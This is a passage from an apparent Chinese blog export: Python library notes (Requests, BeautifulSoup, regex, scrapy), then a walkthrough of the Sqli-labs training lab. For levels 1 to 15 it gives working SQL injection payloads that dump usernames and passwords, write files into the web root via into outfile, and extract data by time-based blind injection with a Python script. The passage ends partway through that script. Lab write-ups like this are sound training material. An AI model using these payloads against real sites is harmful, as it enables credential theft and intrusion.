class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><table><thead><tr><th align="center">异常</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">网络连接错误异常，如DNS查询失败，拒绝连接等</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTP错误异常</td></tr><tr><td align="center">requests.URLRequired</td><td align="center">url缺失异常</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">超过最大重定向次数，产生重定向异常</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">连接远程服务器超时异常</td></tr><tr><td align="center">requests.Timeout</td><td align="center">请求URL超时，产生超时异常</td></tr></tbody></table><h3 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">r.status_code</td><td align="center">HTTP请求的返回状态，200表示连接成功，404表示失败</td></tr><tr><td align="center">r.text</td><td align="center">HTTP响应内容的字符串形式，即，url对应的页面内容</td></tr><tr><td align="center">r.encoding</td><td align="center">从HTTP header中猜测的响应内容编码方式</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">从内容中分析出响应内容编码的方式（备选编码方式）</td></tr><tr><td align="center">r.content</td><td align="center">HTTP响应内容的二进制形式</td></tr></tbody></table><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>也叫beautifulsoup4或bs4</p><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215095808822.png" style="zoom:50%;" loading="lazy"><h3 id="遍历方法"><a href="#遍历方法" class="headerlink" title="遍历方法"></a>遍历方法</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215102120777.png" style="zoom:33%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215101930283.png" style="zoom: 50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215102442134.png" style="zoom:80%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215102747676.png" style="zoom: 67%;" loading="lazy"><p>注：平行遍历发生在同一个父节点下的各节点间</p><p><code>prettify()</code>格式化输出</p><h3 id="内容查找方法"><a href="#内容查找方法" class="headerlink" title="内容查找方法"></a>内容查找方法</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215110510847.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215110603229.png" style="zoom:67%;" loading="lazy"><h3 id="Beautiful-Soup库解析器"><a href="#Beautiful-Soup库解析器" class="headerlink" title="Beautiful Soup库解析器"></a>Beautiful Soup库解析器</h3><table><thead><tr><th align="center">解析器</th><th align="center">使用方法</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">bs4的HTML解析器</td><td align="center">BeautifulSoup(mk,’html.parser’)</td><td align="center">安装bs4库</td></tr><tr><td align="center">lxml的HTML解析器</td><td align="center">BeautifulSoup(mk,’lxml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">lxml的XML解析器</td><td align="center">BeautifulSoup(mk,’xml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">html5lib的解析器</td><td align="center">BeautifulSoup(mk,’html5lib’)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>匹配中文字符：<code>[\u4e00-\u9fa5]</code></p><p>IP地址：<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215171503658.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215171657835.png" style="zoom:67%;" loading="lazy"><h3 id="compile函数"><a href="#compile函数" class="headerlink" title="compile函数"></a>compile函数</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215172803741.png" style="zoom:67%;" loading="lazy"><h3 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215173026458.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215173130093.png" style="zoom:67%;" loading="lazy"><h3 id="最小匹配（非贪婪）"><a href="#最小匹配（非贪婪）" class="headerlink" title="最小匹配（非贪婪）"></a>最小匹配（非贪婪）</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215173716539.png" style="zoom:67%;" loading="lazy"><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><a href="https://blog.csdn.net/github_36601823/article/details/77815013">参考</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/20170903091548442.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/20170903091615951.png" alt loading="lazy"></p><h1 id="scrapy框架"><a href="#scrapy框架" class="headerlink" title="scrapy框架"></a>scrapy框架</h1><h2 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193013443.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193035116.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193058864.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193115484.png" style="zoom:67%;" loading="lazy"><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193155782.png" style="zoom:67%;" loading="lazy"><h2 id="工程目录"><a href="#工程目录" class="headerlink" title="工程目录"></a>工程目录</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193245769.png" style="zoom:67%;" loading="lazy"><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193435792.png" style="zoom:67%;" loading="lazy"><h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193520056.png" style="zoom:67%;" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs靶场</title>
      <link href="/posts/e5cd0178/"/>
      <url>/posts/e5cd0178/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-</strong>1</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39; union select database(),group_concat(username),group_concat(password) from users--+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</code></pre><a id="more"></a><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-</strong>2</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</code></pre><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39;) union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-</strong>4</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&quot;) union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</code></pre><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-</strong>5</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in...........&#39;;      echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;        &#125;</code></pre><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-</strong>6</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;下面的同Less-5</code></pre><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-</strong>7</h1><p>Method：into outfile 文件写入操作，如下：</p><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39;)) union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-7\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in.... Use outfile......&#39;;      echo &quot;&lt;br&gt;&quot;;      echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot;&gt;&#39;;    echo &#39;You have an error in your SQL syntax&#39;;    &#x2F;&#x2F;print_r(mysql_error());    echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;</code></pre><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-</strong>8</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-8\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in...........&#39;;      echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;    &#x2F;&#x2F;echo &#39;You are in...........&#39;;    &#x2F;&#x2F;print_r(mysql_error());    &#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;;    echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;        &#125;</code></pre><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-</strong>9</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-9\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in...........&#39;;      echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;    echo &#39;You are in...........&#39;;    &#x2F;&#x2F;print_r(mysql_error());    &#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;;    echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;        &#125;</code></pre><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-</strong>10</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&quot; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-10\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;echo $sql;echo &quot;&lt;br&gt;&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;          echo &#39;You are in...........&#39;;      echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;    echo &#39;You are in...........&#39;;    &#x2F;&#x2F;print_r(mysql_error());    &#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;;    echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;        &#125;</code></pre><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a><strong>Less-</strong>11</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&#39; union select group_concat(username),group_concat(password) from users;#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;    $result&#x3D;mysql_query($sql);    $row &#x3D; mysql_fetch_array($result);    if($row)    &#123;          &#x2F;&#x2F;echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 4&gt;&#39;;        &#x2F;&#x2F;echo &quot; You Have successfully logged in\n\n &quot; ;        echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot;  &#x2F;&gt;&#39;;              echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else      &#123;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;        &#x2F;&#x2F;echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot; &#x2F;&gt;&#39;;            echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;</code></pre><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a><strong>Less-</strong>12</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&quot;) union select group_concat(username),group_concat(password) from users;#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;    $passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;;     @$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;($uname) and password&#x3D;($passwd) LIMIT 0,1&quot;;    $result&#x3D;mysql_query($sql);    $row &#x3D; mysql_fetch_array($result);    if($row)    &#123;          &#x2F;&#x2F;echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 4&gt;&#39;;        &#x2F;&#x2F;echo &quot; You Have successfully logged in &quot; ;        echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot;   &#x2F;&gt;&#39;;              echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else      &#123;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;        &#x2F;&#x2F;echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot;   &#x2F;&gt;&#39;;            echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;</code></pre><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a><strong>Less-</strong>13</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&#39;) and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;(&#39;$uname&#39;) and password&#x3D;(&#39;$passwd&#39;) LIMIT 0,1&quot;;    $result&#x3D;mysql_query($sql);    $row &#x3D; mysql_fetch_array($result);    if($row)    &#123;          &#x2F;&#x2F;echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 4&gt;&#39;;        &#x2F;&#x2F;echo &quot; You Have successfully logged in &quot; ;        echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot;   &#x2F;&gt;&#39;;              echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else      &#123;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;        &#x2F;&#x2F;echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot;   &#x2F;&gt;&#39;;            echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;</code></pre><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a><strong>Less-</strong>14</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;    $passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;;     @$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;$uname and password&#x3D;$passwd LIMIT 0,1&quot;;    $result&#x3D;mysql_query($sql);    $row &#x3D; mysql_fetch_array($result);    if($row)    &#123;          &#x2F;&#x2F;echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 4&gt;&#39;;        &#x2F;&#x2F;echo &quot; You Have successfully logged in &quot; ;        echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot; &#x2F;&gt;&#39;;              echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else      &#123;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;        &#x2F;&#x2F;echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot;  &#x2F;&gt;&#39;;            echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;</code></pre><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a><strong>Less-</strong>15</h1><p>Python（盲注）:</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeimport sys# config-startsleep_time &#x3D; 1error_time &#x3D; 0.1# config-enddef getPayload(indexOfResult, indexOfChar, mid):    # admin&#39; or ()--     column_name&#x3D;&quot;password&quot;    table_name&#x3D;&quot;username&quot;    database_name&#x3D;&quot;users&quot;    payload &#x3D; &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot;  limit &quot; + indexOfResult + &quot;,1),&quot; + indexOfChar + &quot;,1)))&#x3D;&quot; + mid + &quot;)&quot;#此处更改sql语句    payload &#x3D; &#123;&quot;uname&quot;:&quot;&#39; or ((&quot; + payload + &quot;) and sleep(&quot; + str(sleep_time) + &quot;))-- &quot;,&quot;passwd&quot;:&quot;admin&quot;&#125;    return payloaddef exce(indexOfResult,indexOfChar,queryASCII):    # content-start    url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:801&#x2F;sqli&#x2F;Less-15&#x2F;&quot;    postData &#x3D; getPayload(indexOfResult,indexOfChar,queryASCII)    before_time &#x3D; time.time()    requests.post(url, data&#x3D;postData)    after_time &#x3D; time.time()    # content-end    use_time &#x3D; after_time - before_time    # judge-start    # 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)    # 当使用二分查找的时候 , 控制正确&#x2F;错误的时候执行sleep函数就不那么重要了    if abs(use_time) &gt; error_time:         return True    else:        return False    # judge-enddef doSearch(indexOfResult,indexOfChar):    # 根据数据库中出现的字符的频率顺序重新构造列表进行查询    order &#x3D; [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;_&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;&#x2F;&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;&#x3D;&#39;,&#39;&gt;&#39;,&#39;?&#39;,&#39;@&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;&#96;&#39;,&#39;&#123;&#39;,&#39;|&#39;,&#39;&#125;&#39;,&#39;~&#39;]    for queryChar in order:        queryASCII &#x3D; ord(queryChar)        if exce(str(indexOfResult),str(indexOfChar + 1), str(queryASCII)):            return chr(queryASCII)    return chr(1)def search():    for i in range(32): # 需要遍历的查询结果的数量        counter &#x3D; 0        for j in range(32): # 结果的长度            counter +&#x3D; 1            temp &#x3D; doSearch(i, j) # 从255开始查询            if ord(temp) &#x3D;&#x3D; 1: # 当为1的时候说明已经查询结束                break            sys.stdout.write(temp)            sys.stdout.flush()        if counter &#x3D;&#x3D; 1: # 当结果集的所有行都被遍历后退出            break        sys.stdout.write(&quot;\r\n&quot;)        